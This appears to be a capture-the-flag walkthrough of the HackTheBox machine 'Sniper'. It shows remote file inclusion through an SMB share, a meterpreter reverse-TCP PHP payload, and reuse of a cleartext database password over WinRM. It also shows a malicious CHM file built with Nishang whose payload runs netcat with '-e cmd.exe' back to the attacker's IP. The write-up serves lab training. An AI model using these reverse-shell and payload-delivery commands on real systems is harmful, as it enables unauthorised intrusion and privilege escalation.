@@ -1,0 +1,149 @@
+<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
+<div class="post-content">
+            <div class="post-cats">
+                <span class="cat-links"><a href="https://www.hackingarticles.in/category/ctf-challenges/" rel="category tag">CTF Challenges</a>, <a href="https://www.hackingarticles.in/category/ctf-challenges/hackthebox/" rel="category tag">HackTheBox</a></span>            </div>
+            <h1 class="post-title entry-title">Sniper HackTheBox Walkthrough</h1>            <div class="post-date">
+                                    <div class="entry-meta">
+                        <span class="posted-on"><a href="https://www.hackingarticles.in/sniper-hackthebox-walkthrough/" rel="bookmark"><time class="entry-date published" datetime="2021-02-22T08:11:06+00:00">February 22, 2021</time><time class="updated" datetime="2025-06-22T12:28:54+00:00">June 22, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
+                            </div>
+
+            <div class="content post-excerpt entry-content clearfix">
+                <p><span style="color: #000000;">Today we are going to crack a machine called Sniper. It was created by <span style="color: #0000ff;"><strong>MinatoTW</strong></span> and <span style="color: #0000ff;"><strong>felamos</strong></span>. This is a Capture the Flag type of challenge. This machine is hosted on HackTheBox. Let’s get cracking!</span></p>
+<h3><span style="color: #800000;">Penetration Testing Methodology</span></h3>
+<ul>
+<li><span style="color: #000000;"><strong>Network Scanning</strong></span>
+<ul>
+<li><span style="color: #000000;">Nmap Scan</span></li>
+</ul>
+</li>
+<li><span style="color: #000000;"><strong>Enumeration</strong></span>
+<ul>
+<li><span style="color: #000000;">Browsing HTTP Service</span></li>
+<li><span style="color: #000000;">Enumerating parameters in URL</span></li>
+<li><span style="color: #000000;">Enumerating RFI</span></li>
+</ul>
+</li>
+<li><span style="color: #000000;"><strong>Exploitation</strong></span>
+<ul>
+<li><span style="color: #000000;">Exploiting RFI to get meterpreter</span></li>
+<li><span style="color: #000000;">Enumerating Database credentials</span></li>
+<li><span style="color: #000000;">Enumerating Users</span></li>
+<li><span style="color: #000000;">Enumerating Local Services</span></li>
+<li><span style="color: #000000;">Reading User Flag</span></li>
+</ul>
+</li>
+<li><span style="color: #000000;"><strong>Privilege Escalation</strong></span>
+<ul>
+<li><span style="color: #000000;">Uploading netcat</span></li>
+<li><span style="color: #000000;">Crafting malicious CHM file</span></li>
+<li><span style="color: #000000;">Uploading malicious CHM</span></li>
+<li><span style="color: #000000;">Executing CHM file to get root</span></li>
+<li><span style="color: #000000;">Reading the Root Flag</span></li>
+</ul>
+</li>
+</ul>
+<h3><span style="color: #800000;">Walkthrough</span></h3>
+<h3><span style="color: #800000;">Network Scanning</span></h3>
+<p><span style="color: #000000;">To Attack any machine, we need the IP Address. Machine hosted on HackTheBox have a static IP Address.</span></p>
+<p><span style="color: #000000;">IP Address assigned: <strong>10.129.1.147</strong></span></p>
+<p><span style="color: #000000;">Now that we have the IP Address. We need to enumerate open ports on the machine. For this, we will be running a nmap scan.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">nmap -sC -sV 10.129.1.147</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-JsFt2QyMFOI/YDNjHHGWQ3I/AAAAAAAAt_I/BwXwvpVOaiMWpf8Hjz4zt-9cr3zzzLfcACLcBGAsYHQ/s16000/1.png"/></span></p>
+<p><span style="color: #000000;">The Nmap Version scan quickly gave us some great information. It positively informed that the following ports and services are running: HTTP (80), SMB (135, 139, 445).</span></p>
+<h3><span style="color: #800000;"><strong>Enumeration</strong></span></h3>
+<p><span style="color: #000000;">We had two options here. One was to enumerate the HTTP service and another was to enumerate the SMB service. We started to enumerate the HTTP service first.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">http://10.129.1.171</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-EO_4XfkJuaU/YDNjNb3iLcI/AAAAAAAAt_M/2gY10vscKl4tbl4oWvdy7-ygWsUZw0cggCLcBGAsYHQ/s16000/2.png"/></span></p>
+<p><span style="color: #000000;">Here we had a simple HTML page with a bunch of buttons. The User Portal is the only one functional.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">http://10.129.1.171/blog/index.php</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-SUw7QRfY6Y4/YDNjT8ZnuqI/AAAAAAAAt_Q/c3oIEtwhhEc_Myg4TS35FnROTbMaAucrACLcBGAsYHQ/s16000/3.png"/></span></p>
+<p><span style="color: #000000;">It contained a Login Panel and a Registration Panel. We tried logging in using some default credentials and then tried to register and all that was for nothing.</span></p>
+<p><span style="color: #000000;">Enumerating father got us to the blog page of the website. Tinkering around we clicked on the Language button as shown in the image below.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">http://10.129.1.171/blog/?lang=blog-en.php</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-S4zszJswTqE/YDNjYv64hxI/AAAAAAAAt_Y/XyznqHJsArcB9i8BbbFtRj_3O-pqBqQawCLcBGAsYHQ/s16000/4.png"/></span></p>
+<p><span style="color: #000000;">This changed the URL by adding a parameter of lang and reading a file blog-en.php. This is a File Inclusion. Let’s see what kind of Inclusion is this and can we exploit it?</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">view-source:http://10.129.1.171/blog/?lang=windows/win.ini</pre>
+<p><span style="color: #000000;"><strong> <img decoding="async" src="https://1.bp.blogspot.com/-HvIc-Tf88JM/YDNjdSIgcEI/AAAAAAAAt_g/v031ctzr6skFzDW0oN3MzWSe4PMw7WsugCLcBGAsYHQ/s16000/5.png"/></strong></span></p>
+<p><span style="color: #000000;">Since this is a Windows Based Machine, we tried to browse a windows file. At first, we were unable to read it but as soon as we took a look at the source code of the webpage, we found the contents of /windows/win.ini.</span></p>
+<h4><span style="color: #000000;">Exploiting Remote File Inclusion</span></h4>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">mkdir /tmp/share
+chmod 555 /tmp/share
+chown -R nobody:nogroup /tmp/share
+echo "Welcome to Hacking Articles" &gt; /tmp/share/text.txt</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-BRO5GvStgp0/YDNjiFSA_7I/AAAAAAAAt_k/p97K8FmDlF4jbm538SdjQT01AqjE_WixgCLcBGAsYHQ/s16000/6.png"/></span></p>
+<p><span style="color: #000000;">We see that it can read a file located on the machine. But can it also locate and read the files that are shared in the network? That’s right we are checking if it is an RFI vulnerability.</span></p>
+<p><span style="color: #000000;">For that, we need to configure the SMB so that the target machine can read the file from it. We created a share folder inside the tmp directory and changed its permission to read-only. Then we changed its ownership to nobody so that it can be accessed. At last, we created a text file inside the share folder.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">nano /etc/samba/smb.conf
+service smbd restart</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-RjB7RE8dF1E/YDNjo-tXeoI/AAAAAAAAt_s/3s_CygAJ3mwlpYE_6uXTts86lolBJhl3wCLcBGAsYHQ/s16000/7.png"/></span></p>
+<p><span style="color: #000000;">We also need to make some changes in the smb.conf file. We have to change the path and some other configurations shown in the image below. Restart the service after updating the configurations.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">view-source:http://10.129.1.171/blog/?lang=\\10.10.14.64\share\test.txt</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-TS5jYr-LTOQ/YDNjwP51nwI/AAAAAAAAt_0/aqxgmtuz1RcrznIsAINZBeU6MXItNB6zgCLcBGAsYHQ/s16000/8.png"/></span></p>
+<p><span style="color: #000000;">We try to read this remote file from the URL and lang parameter. We can read the contents of a shared text file. This is a confirmed case of RFI.</span></p>
+<h3><span style="color: #800000;"><strong>Exploitation</strong></span></h3>
+<p><span style="color: #000000;">Now time to pop a shell through this RFI. We crafted a windows-based payload using MSFPC. MSFPC creates two files. One is the payload and another is a run command or rc file.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">msfpc pc 10.10.14.64</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-GMVP5fY8MXM/YDNj0wyyaMI/AAAAAAAAt_8/zbPRtDpLTLsFFlWLlyr6T-W-xGutRONmgCLcBGAsYHQ/s16000/9.png"/></span></p>
+<p><span style="color: #000000;">We transfer the payload file to the share folder we created in the tmp directory.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">cp php-meterpreter-staged-reverse-tcp-443.php /tmp/share/</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-QcEKuVgh2Kw/YDNj6f5ixWI/AAAAAAAAuAE/kyf_VoglcAgONbQxu0vOVcFHS7PWAnDbACLcBGAsYHQ/s16000/10.png"/></span></p>
+<p><span style="color: #000000;">Now we execute the run command or rc file on our local machine and sit back and relax. It will set the appropriate LHOST and LPORT and other commands that are required.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">msfconsole -q -r '/root/php-meterpreter-staged-reverse-tcp-443-php.rc'</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-qYA0WzmmKoc/YDNj_HjX-AI/AAAAAAAAuAI/SFTokw5aPuILjXk5y18Z3NhiTZtGstoMgCLcBGAsYHQ/s16000/11.png"/></span></p>
+<p><span style="color: #000000;">Next, we execute the payload through the web browser by entering the path of the payload file in the lang parameter as shown in the image below.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">http://10.129.1.171/blog/?lang=\\10.10.14.64\share\php-meterpreter-staged-reverse-tcp-443.php</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-IZdbYYznHmI/YDNkDwfJ1TI/AAAAAAAAuAQ/mpw5qZVmBkQOPL0AXv5cIc8BWadXncfRQCLcBGAsYHQ/s16000/12.png"/></span></p>
+<p><span style="color: #000000;">As soon as the payload is executed, we get a meterpreter session on the target machine. We enumerate the session using sysinfo and pwd command. Our shell landed in C:\inetpub\wwwroot\blog directory. We started to look around and in the wwwroot directory, we found the user folder. We checked the user folder to find a db.php file. Upon reading the db.php file we see that we have successfully enumerated the database password.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">sessions 1
+sysinfo
+pwd
+cd user
+cat db.php</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-5s060U-y33Y/YDNkKBiUeeI/AAAAAAAAuAY/C0qDOodQfnYXOCBCLMGKVy5Up2NNWt6AQCLcBGAsYHQ/s16000/13.png"/></span></p>
+<p><span style="color: #000000;">To hunt for the username, we traversed into the Users Directory. here we found Chris User. We tried entering the Chris User’s directory. We couldn’t get in.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">cd C:\\Users
+cd Chris</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-U21A6nw11Ug/YDNkQcq21NI/AAAAAAAAuAg/JMmiwHwYLecJstsTywwc_VQhkqddMDG0ACLcBGAsYHQ/s16000/14.png"/></span></p>
+<p><span style="color: #000000;">Since there are db credentials, there must be a service running associated with it. We enumerate using netstat.</span></p>
+<p><span style="color: #000000;">We found a service running on port 5985</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">netstat -ano</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-P7_HNo1FW38/YDNkWDyvNzI/AAAAAAAAuAo/AnD-4OnimEwJWpnIDyEj4Sa-hPwj3JN6ACLcBGAsYHQ/s16000/15.png"/></span></p>
+<p><span style="color: #000000;">Then, we forwarded the removing service on our local machine using the portfwd command.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">portfwd add -p 5985 -l 5985 -r 127.0.0.1</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-quM3taHA5rA/YDNkbcFXBrI/AAAAAAAAuAw/K-z24V0uvg05D-vx_JkjnYysjYkDpYRwACLcBGAsYHQ/s16000/16.png"/></span></p>
+<p><span style="color: #000000;">Now using Chris as username and the password we got we tried to log in on the service that we forwarded to our local port. We got in. Then, we checked the Desktop of Chris User. We found the user flag.</span></p>
+<h3><span style="color: #800000;">Privilege Escalation</span></h3>
+<p><span style="color: #000000;">To elevate privileges, we started enumerating different directories. This is when we found the Docs directory inside C:\ drive. Inside the Docs directory, there was a note.</span></p>
+<p><span style="color: #000000;">It said:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">Hi Chris,
+ Your php skillz suck. Contact yamitenshi so that he teaches you how to use it and after that fix the website as there are a lot of bugs on it. And I hope that you've prepared the documentation for our new app. Drop it here when you're done with it.
+Thats bad luck for Chris. But php is not that easy when you get into it.</pre>
+<p><span style="color: #000000;">Well, the CEO is talking about some documentation. Let’s see if we find some. While enumerating Chris’s file we see that he did indeed was creating a set of instructions and we found a chm file by the name of instructions inside Chris’s Downloads folder. For those who don’t know chm files are help files that we used to get on smashing F1 keys on certain applications. Now we need to infect that chm file or replace it with a malicious chm file so as to elevate privileges.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">evil-winrm -i 127.0.0.1 -u chris -p '36mEAhz/B8xQ~2VM'
+cd C:\\Users\Chris\Desktop
+cat user.txt
+cd C:\Docs
+cat note.txt</pre>
+<p><span style="color: #000000;"><strong> <img decoding="async" src="https://1.bp.blogspot.com/-hBC2mox2Pj8/YDNkoNE0zhI/AAAAAAAAuA8/D0CqbcC3w_Y3RFzq7NB50vcIeL4mv1PWQCLcBGAsYHQ/s16000/17.png"/></strong></span></p>
+<p><span style="color: #000000;">In any case, we will be needing netcat on windows so why not transfer it. We just made a directory by the name of ignite and uploaded the nc64.exe file to that target machine through meterpreter.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">mkdir ignite
+cd ignite
+upload /root/Downloads/nc64.exe</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-LkVHAiJGxmk/YDNkuZ2sPHI/AAAAAAAAuBE/G9_WTF9FXVUQReCbBfvcTnr3jKAbBPwLACLcBGAsYHQ/s16000/51.png"/></span></p>
+<p><span style="color: #000000;">Now we searched for some time to find a way to create a malicious chm file. We got to the Out-CHM.ps1 PowerShell script part of the Nishang Toolkit. It can be used for this trick. We downloaded the Out-CHM script to our system. We tried to do this on Kali but we were getting some errors and decided to do this on Windows. In payload we added the command to start nc64.exe that we just uploaded and create a connection to our local machine at port 5555. The Out-CHM script converted this into the doc.chm file.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">powershell -ep bypass
+Import-Module .\Out-CHM.ps1
+Out-CHM -Payload "C:\raj\nc64.exe 10.10.14.64 5555 -e cmd.exe" -HHCPath "C:\Program Files (x86)\HTML Help Workshop"</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-7SuxWD8gqfk/YDNk0me-YDI/AAAAAAAAuBI/6MNLBkAYPh0gSVchkwe3HAK-sEnzVuhcwCLcBGAsYHQ/s16000/52.png"/></span></p>
+<h4><span style="color: #000000;">Executing the Payload</span></h4>
+<p><span style="color: #000000;">We transferred the doc.chm file to the target machine similar to the way we transferred the nc64.exe file.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">Invoke-WebRequest -Uri http://10.10.14.64/doc.chm -OutFile c:\docs\doc.chm</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-DVSfJGPPFQg/YDNk5Wt5ovI/AAAAAAAAuBQ/bsHdnD2-Zt8cTiWUTr0Oa9Kuq4sfDY1BwCLcBGAsYHQ/s16000/53.png"/></span></p>
+<p><span style="color: #000000;">Before executing the malicious chm file, we stated a netcat listener at port 5555. Then we executed the chm payload and we got ourselves an Administrator Level Access. We read the root flag to conclude this machine.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">nc -lvp 5555
+cd C:\User\Administrator\Desktop
+cat root.txt</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-RVbP38SLZno/YDNk-P788QI/AAAAAAAAuBY/wi5pnhcDHZoUHGrdTf_w7_jv9tXy6XwGgCLcBGAsYHQ/s16000/54.png"/></span></p>
+<p><span style="color: #000000;">Thank you for giving your precious time to read this walkthrough. I hope you have enjoyed and learned something new today. If you want to read more HTB Write-ups. Follow this</span> <strong><a href="https://www.hackingarticles.in/category/ctf-challenges/hackthebox/">Link.</a></strong> <span style="color: #000000;">Happy Hacking!</span></p>
+<p><span style="color: #000000;"><strong>Author: Pavandeep Singh</strong> is a Technical Writer, Researcher, and Penetration Tester. Contact on <span style="color: #0000ff;"><strong>Twitter</strong></span> and <span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://www.linkedin.com/in/pavan2318/">LinkedIn</a></strong></span></span></p>
+<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
